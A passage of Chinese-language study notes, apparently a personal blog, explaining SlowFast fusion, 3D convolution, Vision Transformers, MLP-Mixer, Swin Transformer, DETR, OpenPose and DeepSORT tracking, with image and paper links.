alt="Snipaste_2022-12-04_20-47-29"></p><p>Slow与Fast分支提取的特征需要进行融合，如上图，SlowFast采用的是将Fast分支的特征通过侧向连接（Lateral connections）送入Slow分支进行混合。但是两个分支的特征维度是不一致的（Fast分支是{αT, S², βC} 而Slow分支是 {T, S², αβC}），因此SlowFast需要对Fast分支的结果进行数据变换。</p><p>论文给出了三种进行数据变换的技术思路，其中第三个思路在实践中最有效。</p><ol><li>Time-to-channel：将{αT, S², βC} 的特征变形为 {T , S², αβC}之后就行融合，就是说把α帧压入一帧</li><li>Time-strided采样：简单地每隔α帧进行采样，{αT , S², βC} 就变换为 {T , S², βC}</li><li>Time-strided卷积: 用一个5×1×1的3d卷积， 输出通道为2βC，步长为 α.</li></ol><p>这三种方案的实验结果如下图所示，Time-Strided卷积的效果最好。</p><p>此外作者还尝试了双向侧链接，即将Slow分支结果也送入Fast分支，但是对性能没有改善。</p><h4 id="3d卷积"><a href="#3d卷积" class="headerlink" title="3d卷积"></a>3d卷积</h4><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/Snipaste_2022-12-04_20-58-44-20221204%2022:05:26.png" alt="Snipaste_2022-12-04_20-58-44"></p><p>a)和b)分别为2D卷积用于单通道图像和多通道图像的情况（多通道图像可以指同一张图片的3个颜色通道，也可以指多张堆叠在一起的图片）。对于每一个滤波器（卷积核），输出一张二维的特征图，多通道的信息被完全压缩了。输出的通道数由滤波器个数决定，有几个滤波器，输出就有几个通道。</p><p>而c)中3D卷积的输出仍然为3D的特征图。</p><p>现在考虑一个视频段输入，其大小为 c∗l∗h∗w ，其中c为图像通道(一般为3)，l为视频序列的长度，h和w分别为视频的宽与高。进行一次kernel_size为3∗3∗3，stride为1，padding&#x3D;‘same’，n_filters&#x3D;K的3D 卷积后，输出的大小为K∗l∗h∗w。池化同理。</p><p><strong>卷积核的维度</strong></p><p>卷积核的维度指的的进行滑窗操作的维度，而滑窗操作不在channel维度上进行，不管有几个channel，它们都共享同一个滑窗位置（虽然2D多channel卷积的时候每个channel上的卷积核权重是独立的，但滑窗位置是共享的）。所以在讨论卷积核维度的时候，是不把channel维加进去的。</p><p>2D conv的卷积核就是(c, k_h, k_w)，因此，对于RGB图像做2D卷积，卷积核可以是conv2D(3,3) 而不该是conv3D(3,3,3)</p><p>3D conv的卷积核就是(c, k_d, k_h, k_w)，其中k_d就是多出来的第三维，根据具体应用，在视频中就是时间维，在CT图像中就是层数维</p><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/Snipaste_2022-12-04_21-03-07-20221204%2022:05:35.png" alt="Snipaste_2022-12-04_21-03-07"></p><p>针对单通道，与2D卷积不同之处在于，输入图像多了一个 depth 维度，故输入大小为(1, depth, height, width)，卷积核也多了一个k_d维度，因此卷积核在输入3D图像的空间维度（height,width和depth维度）上均进行滑窗操作，每次滑窗与 (k_d, k_h, k_w) 窗口内的values进行相关操作，得到输出3D图像中的一个value，最终输出一个3D的特征图。</p><p>这里的3D不是通道导致的，而是深度（多层切片，多帧视频），因此，虽然输入和卷积核和输出都是3D的，但都可以是单通道的。</p><p>针对多通道，输入大小为(3, depth, height, width)，与2D多通道卷积的操作类似，对于每次滑窗，卷积核同时与3个channels上的 (k_d, k_h, k_w) 窗口内的所有values进行相关操作，得到输出3D图像中的一个value。</p><p>由于3D卷积中的卷积核是3D的，因此在每个channel下使用的是同样的参数，权重共享。不同于2D多通道下的卷积核，后者在每一个channel使用的权重是一样的，不同的通道权重可能不一样。</p><h4 id="实践：视频异常检测"><a href="#实践：视频异常检测" class="headerlink" title="实践：视频异常检测"></a>实践：视频异常检测</h4><h3 id="7-transformer"><a href="#7-transformer" class="headerlink" title="7. transformer"></a>7. transformer</h3><h4 id="在视觉的应用vit"><a href="#在视觉的应用vit" class="headerlink" title="在视觉的应用vit"></a>在视觉的应用vit</h4><h5 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h5><p>重点介绍ViT原理，同时简单介绍三篇相关论文，这四篇论文的源码见 <a href="https://link.zhihu.com/?target=https://github.com/google-research/vision_transformer">https://github.com/google-research/vision_transformer</a></p><p><a href="https://link.zhihu.com/?target=https://arxiv.org/abs/2010.11929">arXiv:2010.11929</a>：An image is worth 16x16 words: Transformers for image recognition at scale（ViT大法，一般人没钱做的工作）</p><p><a href="https://link.zhihu.com/?target=https://arxiv.org/abs/2105.01601">arXiv:2105.01601</a>：MLP-Mixer: An all-MLP Architecture for Vision （用MLPs替代self-attention可以得到和ViT同样好的结果）</p><p><a href="https://link.zhihu.com/?target=https://arxiv.org/abs/2106.01548">arXiv:2106.01548</a>：When Vision Transformers Outperform ResNets without Pre-training or Strong Data Augmentations （不使用大规模预训练和强数据增强ViT是否依然可以表现优秀）</p><p><a href="https://link.zhihu.com/?target=https://arxiv.org/abs/2106.10270">arXiv:2106.10270</a>：How to train your ViT? Data, Augmentation, and Regularization in Vision Transformers （通过大量实验，总共训练了超过5w个ViT，教你如何训练自己的ViT模型，以及数据增广和模型正则化什么时候有用）</p><p>有关transformer结构和原理，大家可以参考：<a href="https://zhuanlan.zhihu.com/p/410258597">Transformer解析</a></p><p>本文重点介绍ViT原理，同时简单介绍三篇相关论文，这四篇论文的源码见 <a href="https://link.zhihu.com/?target=https://github.com/google-research/vision_transformer">https://github.com/google-research/vision_transformer</a></p><p><a href="https://link.zhihu.com/?target=https://arxiv.org/abs/2010.11929">arXiv:2010.11929</a>：An image is worth 16x16 words: Transformers for image recognition at scale（ViT大法，一般人没钱做的工作）</p><p><a href="https://link.zhihu.com/?target=https://arxiv.org/abs/2105.01601">arXiv:2105.01601</a>：MLP-Mixer: An all-MLP Architecture for Vision （用MLPs替代self-attention可以得到和ViT同样好的结果）</p><p><a href="https://link.zhihu.com/?target=https://arxiv.org/abs/2106.01548">arXiv:2106.01548</a>：When Vision Transformers Outperform ResNets without Pre-training or Strong Data Augmentations （不使用大规模预训练和强数据增强ViT是否依然可以表现优秀）</p><p><a href="https://link.zhihu.com/?target=https://arxiv.org/abs/2106.10270">arXiv:2106.10270</a>：How to train your ViT? Data, Augmentation, and Regularization in Vision Transformers （通过大量实验，总共训练了超过5w个ViT，教你如何训练自己的ViT模型，以及数据增广和模型正则化什么时候有用）</p><p>有关transformer结构和原理，大家可以参考：<a href="https://zhuanlan.zhihu.com/p/410258597">Transformer解析</a></p><h5 id="vit"><a href="#vit" class="headerlink" title="vit"></a>vit</h5><p>ViT是2020年Google团队提出的将Transformer应用在图像分类的模型，虽然不是第一篇将transformer应用在视觉任务的论文，但是因为其模型“简单”且效果好，可扩展性强（scalable，模型越大效果越好），成为了transformer在CV领域应用的里程碑著作，也引爆了后续相关研究</p><p>把最重要的说在最前面，ViT原论文中最核心的结论是，当拥有足够多的数据进行预训练的时候，ViT的表现就会超过CNN，突破transformer缺少归纳偏置的限制，可以在下游任务中获得较好的迁移效果</p><p>但是当训练数据集不够大的时候，ViT的表现通常比同等大小的ResNets要差一些，因为Transformer和CNN相比缺少归纳偏置（inductive bias），即一种先验知识，提前做好的假设。CNN具有两种归纳偏置，一种是局部性（locality&#x2F;two-dimensional neighborhood structure），即图片上相邻的区域具有相似的特征；一种是平移不变形（translation equivariance）， f(g(x))&#x3D;g(f(x)) ，其中g代表卷积操作，f代表平移操作。当CNN具有以上两种归纳偏置，就有了很多先验信息，需要相对少的数据就可以学习一个比较好的模型</p><p>ViT将输入图片分为多个patch（16x16），再将每个patch投影为固定长度的向量送入Transformer，后续encoder的操作和原始Transformer中完全相同。但是因为对图片分类，因此在输入序列中加入一个特殊的token，该token对应的输出即为最后的类别预测</p><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/Snipaste_2022-12-04_21-11-40-20221204%2022:05:53.png" alt="Snipaste_2022-12-04_21-11-40"></p><p>按照上面的流程图，一个ViT block可以分为以下几个步骤</p><p>(1) patch embedding：例如输入图片大小为224x224，将图片分为固定大小的patch，patch大小为16x16，则每张图像会生成224x224&#x2F;16x16&#x3D;196个patch，即输入序列长度为<strong>196</strong>，每个patch维度16x16x3&#x3D;<strong>768</strong>，线性投射层的维度为768xN (N&#x3D;768)，因此输入通过线性投射层之后的维度依然为196x768，即一共有196个token，每个token的维度是768。这里还需要加上一个特殊字符cls，因此最终的维度是<strong>197x768</strong>。到目前为止，已经通过patch embedding将一个视觉问题转化为了一个seq2seq问题</p><p>(2) positional encoding（standard learnable 1D position embeddings）：ViT同样需要加入位置编码，位置编码可以理解为一张表，表一共有N行，N的大小和输入序列长度相同，每一行代表一个向量，向量的维度和输入序列embedding的维度相同（768）。注意位置编码的操作是sum，而不是concat。加入位置编码信息之后，维度依然是<strong>197x768</strong></p><p>(3) LN&#x2F;multi-head attention&#x2F;LN：LN输出维度依然是197x768。多头自注意力时，先将输入映射到q，k，v，如果只有一个头，qkv的维度都是197x768，如果有12个头（768&#x2F;12&#x3D;64），则qkv的维度是197x64，一共有12组qkv，最后再将12组qkv的输出拼接起来，输出维度是197x768，然后在过一层LN，维度依然是<strong>197x768</strong></p><p>(4) MLP：将维度放大再缩小回去，197x768放大为197x3072，再缩小变为<strong>197x768</strong></p><p>一个block之后维度依然和输入相同，都是197x768，因此可以堆叠多个block。最后会将特殊字符cls对应的输出 zL0 作为encoder的最终输出 ，代表最终的image presentation（另一种做法是不加cls字符，对所有的tokens的输出做一个平均），后面接一个MLP进行图片分类</p><p>关于image presentation</p><p>是否可以直接使用average pooling得到最终的image presentation，而不加特殊字符cls，通过实验表明，同样可以使用average pooling，原文ViT是为了尽可能是模型结构接近原始的Transformer，所以采用了类似于BERT的做法，加入特殊字符</p><p>关于positional encoding</p><p>1-D 位置编码：例如3x3共9个patch，patch编码为1到9</p><p>2-D 位置编码：patch编码为11,12,13,21,22,23,31,32,33，即同时考虑X和Y轴的信息，每个轴的编码维度是D&#x2F;2</p><p>实际实验结果表明，不管使用哪种位置编码方式，模型的精度都很接近，甚至不适用位置编码，模型的性能损失也没有特别大。原因可能是ViT是作用在image patch上的，而不是image pixel，对网络来说这些patch之间的相对位置信息很容易理解，所以使用什么方式的位置编码影像都不大</p><p>关于CNN+Transformer</p><p>既然CNN具有归纳偏置的特性，Transformer又具有很强全局归纳建模能力，使用CNN+Transformer的混合模型是不是可以得到更好的效果呢？将224x224图片送入CNN得到16x16的特征图，拉成一个向量，长度为196，后续操作和ViT相同</p><p>关于输入图片大小</p><p>通常在一个很大的数据集上预训练ViT，然后在下游任务相对小的数据集上微调，已有研究表明在分辨率更高的图片上微调比在在分辨率更低的图片上预训练效果更好（It is often beneficial to fine-tune at higher resolution than pre-training）（参考<em>2019-NIPS-Fixing the train test resolution discrepancy</em>）</p><p>当输入图片分辨率发生变化，输入序列的长度也发生变化，虽然ViT可以处理任意长度的序列，但是预训练好的位置编码无法再使用（例如原来是3x3，一种9个patch，每个patch的位置编码都是有明确意义的，如果patch数量变多，位置信息就会发生变化），一种做法是使用插值算法，扩大位置编码表。但是如果序列长度变化过大，插值操作会损失模型性能，这是ViT在微调时的一种局限性</p><p>当在很大的数据集上预训练时，ViT性能超越CNN。</p><h5 id="MLPs"><a href="#MLPs" class="headerlink" title="MLPs"></a>MLPs</h5><p>ViT作者团队出品，在CNN和Transformer大火的背景下，舍弃了卷积和注意力机制，提出了MLP-Mixer，一个完全基于MLPs的结构，其MLPs有两种类型，分别是<strong>channel-mixing MLPs</strong>和<strong>token-mixing MLPs</strong>，前者独立作用于image patches（融合通道信息），后者跨image patches作用（融合空间信息）。实验结果表明该结构和SOTA方法同样出色，证明了convolution和attention不是必要操作，如果将其替换为简单的MLP，模型依然可以完美work</p><p>mixer结构</p><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/Snipaste_2022-12-04_21-18-33-20221204%2022:06:06.png" alt="Snipaste_2022-12-04_21-18-33"></p><p>类似于ViT，首先进行patch embedding操作，一个Mixer Layer中包含了channel-mixing MLPs和token-mixing MLPs，但是Mixer不适用positional encoding，因为token-mixing MLPs对输入tokens的顺序非常敏感</p><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/Snipaste_2022-12-04_21-23-06-20221204%2022:06:17.png" alt="Snipaste_2022-12-04_21-23-06"></p><p>token-mixing MLPs：允许信息在空间维度交互，独立作用于每一个channel，作用于列，融合不同token的特征</p><p>channel-mixing MLPs：允许信息在通道交互，独立作用于每一个token，作用于行，融合不同channel的特征</p><p>输入image的分辨率为 H×W ，patch的分辨率为 P×P，则patch的数量 S&#x3D;HW&#x2F;P2 ，所有的patch拉直后线性投影到维度 C ，则得到Mixer Layer的输入 X∈RS×C 。token-mixing MLPs作用于 X 的列，特征维度不发生变化（ RS→RS ），channel-mixing MLPs作用于 X 的行，特征维度同样不发生变化（ RC→RC ）。每一个MLP包含两个全连接层和一个非线性激活（GELU），一个Mixer layers的公式如下，计算复杂度和输入patches的数量成线性关系（ViT是平方关系）</p><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/Snipaste_2022-12-04_21-24-02-20221204%2022:06:25.png" alt="Snipaste_2022-12-04_21-24-02"></p><p>需要注意token-mixing MLPs共享参数，channel-mixing MLPs同样共享参数，因此避免了当输入特征维度增加（ C 变大）或者输入序列长度增加（ S 变大）时，模型参数量急剧增加的情况，极大减少了内存消耗</p><p>模型最后接global average pooling+a linear classifier</p><p><strong>实验结果</strong></p><p>当在大规模数据集上预训练（100million images），Mixer可以接近CNNs和Transformers的SOTA表现，在ImageNet上达到87.94%的top-1 accuracy；当在更小规模数据集上预训练时（10million），结合一些regularization techniques，Mixer可以接近ViT的性能，但是稍逊于CNN</p><h5 id="without-Pre-training-or-Strong-Data-Augmentations"><a href="#without-Pre-training-or-Strong-Data-Augmentations" class="headerlink" title="without Pre-training or Strong Data Augmentations"></a>without Pre-training or Strong Data Augmentations</h5><p>ViTs和MLPs的相关研究目前大多都非常依赖海量数据，在大规模数据集上的预训练以及强数据增广都是基本操作，但是在模型实际优化过程中依然存在诸多困难，比如对初始化和学习率非常敏感。因此作者从损失几何（loss geometry&#x2F;loss landscape geometry）的角度探究ViTs和MLP-Mixers（从损失几何的角度说白了就是用SAM方法对loss做平滑），<strong>旨在让模型摆脱对大规模预训练以及强数据增广的依赖</strong>，提升模型在训练阶段对数据的利用效率，以及推理阶段的泛华能力（intending to improve the models’ data efficiency at training and generalization at inference）</p><p>通过可视化和 Hessian 发现了收敛模型极其尖锐的局部最小值（sharp local minima of the converged models），因此使用最近提出的锐度感知优化器（sharpness-aware optimizer&#x2F;sharpness-aware minimizer，<strong>SAM</strong>）提高平滑度（promote smoothness），得到更加平滑的损失函数（much flatter loss landspace&#x2F; smoothed loss landspace），大大提升了ViTs和MLPs在多个任务上的准确度和鲁棒性，包括监督、对抗、对比、迁移学习等（使用简单的 Inception 式预处理，ViT-B&#x2F;16 和 Mixer-B&#x2F;16 在 ImageNet 上的top-1准确率分别提升了5.3% 和11.0%）</p><p>改进的平滑度归因于前几层中较稀疏的激活神经元（the improved smoothness attributes to sparser active&#x2F;activated neurons in the first few layers）。在没有大规模预训练或强数据增强的情况下，在 ImageNet 上从头开始训练时，所得 ViT 的性能优于类似大小和吞吐量（throughput）的 ResNet。还拥有更敏锐的注意力图（more perceptive attention maps）</p><h5 id="how-to-train-your-vit"><a href="#how-to-train-your-vit" class="headerlink" title="how to train your vit"></a>how to train your vit</h5><p>ViT在很多视觉任务上都展现了相当优秀的性能，但是和CNN相比，缺少归纳偏置让ViT应用于小数据集时非常依赖模型正则化（model regularization）和数据增广（data augmentation）（把模型正则化和数据增广合起来简称AugReg）</p><p>作者使用系统性的实证研究方法（systematic empirical study），探究训练数据量、AugReg、模型大小、计算成本的interpaly（相互影响&#x2F;影响），说白了就是做了大量实验，用实验结果说明问题，总共训练了超过50000个ViT模型，结果发布在了 <a href="https://link.zhihu.com/?target=https://github.com/rwightman/pytorch-image-models">https://github.com/rwightman/pytorch-image-models</a> 和 <a href="https://link.zhihu.com/?target=https://github.com/google-research/vision_">https://github.com/google-research/vision_ transformer</a></p><p>实验表明，当增加计算成本（Improved compute&#x2F;Increased compute budget），即让模型训练更长时间已达到一定的性能，同时使用AugReg会带来意想不到的效果：在ImageNet-21k（14million）上训练的ViT模型，和在JFT-300M上训练的ViT模型相比拥有更好的性能。同时大量实验也揭示了各类techniques的对模型性能的影响，以及什么时候AugReg对模型性能有益&#x2F;什么时候无益</p><p>作者还对ViT迁移学习进行了深入分析。结论是<strong>即使下游数据似乎与预训练数据只有微弱的关联，迁移学习仍然是最佳选择。</strong>作者分析还表明，对于迁移学习来说，训练数据更多的模型和数据增强更多的模型相比较（among similarly performing pre-trained models），前者可能是更好的选择，下游任务性能表现更好。该研究的意义在哪，当我们的计算成本有限时，可以通过本研究的结论选择一种方式，更高效的优化ViT模型</p><h4 id="swintransformer"><a href="#swintransformer" class="headerlink" title="swintransformer"></a>swintransformer</h4><p>“Swin Transformer: Hierarchical Vision Transformer using Shifted Windows” 是MSRA今年三月份上传到arXiv的一篇论文，论文中提出了一种新型的Transformer架构(Swin Transformer)，其利用滑动窗口和分层结构使得Swin Transformer成为了机器视觉领域新的Backbone，在图像分类、目标检测、语义分割等多种机器视觉任务中达到了SOTA水平。</p><p>Paper：<a href="https://link.zhihu.com/?target=https://arxiv.org/abs/2103.14030v1?ref=hackernoon.com">https://arxiv.org/abs/2103.14030v1?ref=hackernoon.comarxiv.org/abs/2103.14030v1?ref=hackernoon.com</a></p><p>Transformer应用在机器视觉领域遇到的问题：</p><ol><li>图片的scale变化非常大，非固定标准</li><li>相较于文本信息，图片有更大的分辨率，Transformer的计算复杂度是token数量的平方(图1,每个token都要与其他token计算QK值)，如果将每个像素值算作一个token，其计算量非常大，不利于在多种机器视觉任务中的应用</li></ol><p>Swin Transformer 解决以上问题的方法</p><ol><li>通过与CNN相似的分层结构来处理图片，使得模型能够灵活处理不同尺度的图片</li></ol><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/Snipaste_2022-12-04_21-31-45-20221204%2022:06:38.png" alt="Snipaste_2022-12-04_21-31-45"></p><p>其中涉及到窗口self-attention计算，不重叠窗口间的联系，mask的计算，相对位置编码的计算。</p><ol start="2"><li>Swin Transformer 采用的是window self-attention，降低了计算复杂度。</li></ol><p>假设一张图片共有 h∗w 个patches(每个patches是原图4*4像素区域），每个窗口包括 M∗M 个patches，根据图1，</p><p>原始Transformer self-attention计算复杂度 &#x3D; $(hw)^2$</p><p>在Swin Transformer中采用的是window self-attention，其计算复杂度为窗口计算复杂度*窗口数量，窗口数量&#x3D; $h∗w&#x2F;M^2$ ,窗口计算复杂度&#x3D; $(M2)^2$ ，</p><p>Swin Transformer self-attention计算复杂度 &#x3D; $h∗w&#x2F;M^2∗(M^2)^2&#x3D;M^2∗(hw)$</p><p>计算复杂度由patches数量的平方关系降低到线性关系。</p><p>论文的总体结构图</p><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/Snipaste_2022-12-04_21-34-43-20221204%2022:06:50.png" alt="Snipaste_2022-12-04_21-34-43"></p><p>程序的逻辑框架图</p><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/Snipaste_2022-12-04_21-35-11-20221204%2022:07:00.png" alt="Snipaste_2022-12-04_21-35-11"></p><p>程序主要分为三个部分：</p><ol><li><p>图像处理：将RGB像素分辨率的图像转化为patches分辨率图像并根据具体模型大小改变输入通道数(图5)。</p></li><li><p>Swin Transformer stage：实现window self-attention及shifted window self-attention，通过Patch Merging实现分层结构，降低计算复杂度并能够处理不同尺度的图片。图片中*2代表此处有两个Swin Transformer Block，模型大小不同对应的Swin Transformer Block个数不同(图5)。</p></li><li><p>不同视觉任务输出：不同任务有不同的输出，此处以图像分类任务为例进行说明，所以Part2输出根据任务要求转换成对应的输出。</p></li></ol><p><strong>论文和程序中都要注意三个不同的概念，分别是resolution&#x2F; patches&#x2F; windows</strong></p><p><strong>resolution:</strong> 输入图片的分辨率是像素分辨率，程序Part 1 输入图片是像素分辨率，但是Part 2程序中对应的H&#x2F;W是patches 分辨率，不是像素分辨率。</p><p><strong>patches:</strong> 图像4<em>4像素区域称为一个patch，分类任务输入图像像素分辨率是224</em>224，patch_size &#x3D; 4，所以patches__resolution &#x3D; 56*56</p><p><strong>windows:</strong> 窗口大小由patches定义的，不是像素定义的，论文及程序中window_size &#x3D; 7，说明一个window有7*7&#x3D;49个patches</p><h4 id="基于transformer的detr目标检测"><a href="#基于transformer的detr目标检测" class="headerlink" title="基于transformer的detr目标检测"></a>基于transformer的detr目标检测</h4><p><a href="https://link.zhihu.com/?target=https://www.ecva.net/papers/eccv_2020/papers_ECCV/papers/123460205.pdf">DETR</a>的全称是DEtection TRansformer，是Facebook提出的基于Transformer的端到端目标检测网络，发表于ECCV2020，代码已开源：</p><p>作为Transformer用在目标检测领域的开山之作，DETR是CV领域学习Transformer绕不过的一道坎。前人栽树后人乘凉，学习一些经典的思路和代码对自己的提升也是巨大的。</p><p>DETR的思路和传统的目标检测的本质思路有相似之处，但表现方式很不一样。传统的方法比如Anchor-based方法本质上是对预定义的密集anchors进行类别的分类和边框系数的回归。DETR则是将目标检测视为一个集合预测问题（集合和anchors的作用类似）。由于Transformer本质上是一个序列转换的作用，因此，可以将DETR视为一个从图像序列到一个集合序列的转换过程。该集合实际上就是一个<strong>可学习的位置编码</strong>（文章中也称为object queries或者output positional encoding，代码中叫作query_embed）。</p><p>网络结构</p><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/Snipaste_2022-12-04_21-37-34-20221204%2022:07:10.png" alt="Snipaste_2022-12-04_21-37-34"></p><p>DETR使用的Transformer结构和原始版本稍有不同：</p><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/Snipaste_2022-12-04_21-38-20-20221204%2022:07:19.png" alt="Snipaste_2022-12-04_21-38-20"></p><p>详情了解：<a href="https://zhuanlan.zhihu.com/p/348060767">这里</a></p><h3 id="8-3d点云"><a href="#8-3d点云" class="headerlink" title="8. 3d点云"></a>8. 3d点云</h3><h4 id="pointnet"><a href="#pointnet" class="headerlink" title="pointnet"></a>pointnet</h4><h4 id="pointnet-1"><a href="#pointnet-1" class="headerlink" title="pointnet++"></a>pointnet++</h4><h4 id="点云补全pf-net"><a href="#点云补全pf-net" class="headerlink" title="点云补全pf-net"></a>点云补全pf-net</h4><h4 id="点云配准"><a href="#点云配准" class="headerlink" title="点云配准"></a>点云配准</h4><h3 id="9-目标追踪与姿态估计"><a href="#9-目标追踪与姿态估计" class="headerlink" title="9. 目标追踪与姿态估计"></a>9. 目标追踪与姿态估计</h3><blockquote><p> YOLO系列 + Deepsort系列 + Openpose系列</p></blockquote><h4 id="姿态估计openpose"><a href="#姿态估计openpose" class="headerlink" title="姿态估计openpose"></a>姿态估计openpose</h4><p>得到人体各个关键点位置，将他们按顺序进行拼接</p><p>难点：遮挡、匹配</p><p>COCO数据集提供17个关键点（openpose为18个关键点：脖子：左肩膀右肩膀做平均）</p><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/image-20220920212233033-20220920%2021:22:33.png" alt="image-20220920212233033"></p><p>Top-down方法：先检测得到所有人的框（目标检测），再对每一个框进行姿态估计输出结果。优点：准；缺点：依赖目标检测、非极大值抑制会让重叠目标或小目标丢失、算法复杂度和人数成正比，不适合实时</p><p><strong>Multi-Person Pose Estimation using Part Affinity Fields</strong></p><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/image-20220920214803080-20220920%2021:48:03.png" alt="image-20220920214803080"></p><p>获得关键点：通过热度图得到每一个关键点的预测结果（每个关键点单独预测，18个关键点需要18张特征图）</p><p>拼接：找到最合适的拼接方向PAF（19个拼接方式，19*2个特征图）</p><blockquote><p>在标签中，设计PAF来表示关键点连接向量</p><p>PAF标签定义：将两个关键点的V向量做成单位向量，在手臂上任何一点P的向量与V一致，论文中给定了距离阈值</p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/image-20220920220704638-20220920%2022:07:04.png" alt="image-20220920220704638"/><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/image-20220920220955266-20220920%2022:09:55.png" alt="image-20220920220955266" style="zoom:50%;" /><p>求$X_{j_1}$和$X_{j_2}$间各点的PAF在险段上投影的积分，线段上各点的PAF方向如果与线段的方向越接近权值就越大</p><p>找每个头和每个左肩膀投影的得分值，找到最大的，就是最好最合适的方向</p></blockquote><p>匹配方法：固定成二分，可以直接套用匈牙利算法，每个点先与其他一个点做匹配</p><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/image-20220921140114594-20220921%2014:01:14.png" alt="image-20220921140114594"></p><p><strong>整体框架：</strong></p><ul><li>分别经过两个分支得到各自预测结果</li><li>基于各分支结果组成骨架</li></ul><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/image-20220921140403694-20220921%2014:04:03.png" alt="image-20220921140403694"></p><p>最早：Convolutional Pose Machines:</p><ul><li>为OpenPose后面的工作奠定了基础，也可以当作基础框架</li><li>通过多个stage来不断优化关键点位置（stage1预测完全错误，2，3在纠正）</li><li>stage越多相当于层数越深，模型感受野越大，姿态估计需要更大感受野</li><li>每个stage都要加损失函数，需要中间过程也做得好</li></ul><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/image-20220921140654630-20220921%2014:06:54.png" alt="image-20220921140654630"></p><p>openpose的做法：</p><ul><li>两个网络结构分别搞定：1.关键点预测，2.姿势的‘亲和力’向量</li><li>多个stage，相当于纠正的过程，不断调整预测结果</li></ul><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/image-20220921141931643-20220921%2014:19:31.png" alt="image-20220921141931643"></p><blockquote><p>代码：</p><p>预存：Realtime_Multi-Person_Pose_Estimation</p><p>github相关：（关键词：openpose）</p><p>Hzzone pytorch-openpose：<a href="https://github.com/Hzzone/pytorch-openpose">https://github.com/Hzzone/pytorch-openpose</a></p><p>c++版的，star更多所以还是放在这里吧：<a href="https://github.com/CMU-Perceptual-Computing-Lab/openpose">https://github.com/CMU-Perceptual-Computing-Lab/openpose</a></p></blockquote><h4 id="deepsort"><a href="#deepsort" class="headerlink" title="deepsort"></a>deepsort</h4><p>卡尔曼滤波</p><ul><li><p>根据已知信息估计最优位置</p></li><li><p>本质是优化估计算法</p></li><li><p>例如估计人在下一帧的位置</p></li><li><p>基于估计值和观测值进行综合（如下一帧预测值和下一帧检测值）</p></li><li><p>卡尔曼增益的目的是让最优估计值的方差更小，相当于一个权重值，怎么利用估计和观测决定了卡尔曼滤波的核心作用</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/image-20220921153305685-20220921%2015:33:05.png" alt="image-20220921153305685"></p><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/image-20220921153606066-20220921%2015:36:06.png" alt="image-20220921153606066"></p><ul><li>两大核心模块：prediction和update</li><li>预测阶段：预测状态估计值及其协方差（在单状态中，协方差矩阵就是其方差，他是预测状态中的不确定性的度量&#x2F;噪声导致的）</li><li>更新阶段：基于预测值更新参数，预测完需要根据观测值来修正，修正后的状态值去估计下一帧</li></ul><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/image-20220921154801512-20220921%2015:48:01.png" alt="image-20220921154801512"></p><p>追踪问题需要考虑的状态：</p><ul><li><p>均值（Mean）：8维向量表示为 x &#x3D; [cx, cy, r, h, vx, vy, vr, vh]</p></li><li><p>中心坐标（cx, cy），宽高比r，高h，以及各自的速度变化值组成</p></li><li><p>协方差矩阵：表示目标位置信息的不确定性，由8*8的矩阵表示</p></li><li><p>追踪过程也要分为两个阶段</p></li><li><p>每一个track都要预测下一时刻的状态，并基于检测到的结果来修正（匀速、线性）</p></li></ul><p>匈牙利算法：</p><ul><li>在完成匹配的同时最小化代价矩阵</li><li>算法过程：</li><li>对于矩阵的每一行，减去其中最小的元素</li><li>对于矩阵的每一列，减去其中最小的元素</li><li>（3）用最少的水平线或垂直线覆盖矩阵中所有的0</li><li>如果线的数量&#x3D;N，则找到了最优分配，算法结束，否则下一步</li><li>找到没有被任何线覆盖的最小元素，每个没被线覆盖的行减去这个元素，每个被线覆盖的列加上这个元素，返回（3）</li></ul><blockquote><p>调用：sklearn:linear_assignment(); scipy:linear_sum_assignment()</p></blockquote><ul><li>运动信息匹配（卡尔曼估计）、外观匹配（ReID）、IOU匹配（BBOX）</li></ul><p>ReID特征：</p><ul><li>追踪人所以用到了ReID，如果追踪其他目标需要自己训练</li><li>对输入的bbox进行特征提取，返回128维特征</li></ul><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/image-20220921170526712-20220921%2017:05:26.png" alt="image-20220921170526712"></p><ul><li>根据当前检测的所有bbox与当前所有track，先得到其所有ReID特征</li><li>当前每一个track均存了一个特征序列（就是每一次匹配会保留一份特征）</li><li>例如一个track有5份128维向量，选其与每个bbox余弦距离最小的作为输入</li><li>track保存的特征数量是有上限的，默认参数是100个</li></ul><p>追踪任务基本流程：</p><ul><li>目标检测+追踪（对检测的bbox提取各项特征后进行匹配）</li></ul><p>前身：sort算法（只对位置和运动信息进行匹配，不关注里面的内容）</p><ol><li><p>卡尔曼预测与更新</p></li><li><p>匈牙利匹配返回结果</p></li></ol><ul><li>将预测后的tracks和当前帧中的detections进行匹配（IOU匹配）</li><li>没有REID等深度学习特征</li></ul><p><strong>deepsort算法</strong></p><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/image-20220921192135436-20220921%2019:21:35.png" alt="image-20220921192135436"></p><ul><li>级联匹配:代价函数由运动特征(卡尔曼预测)与ReID特征计算的距离组成</li></ul><p><img 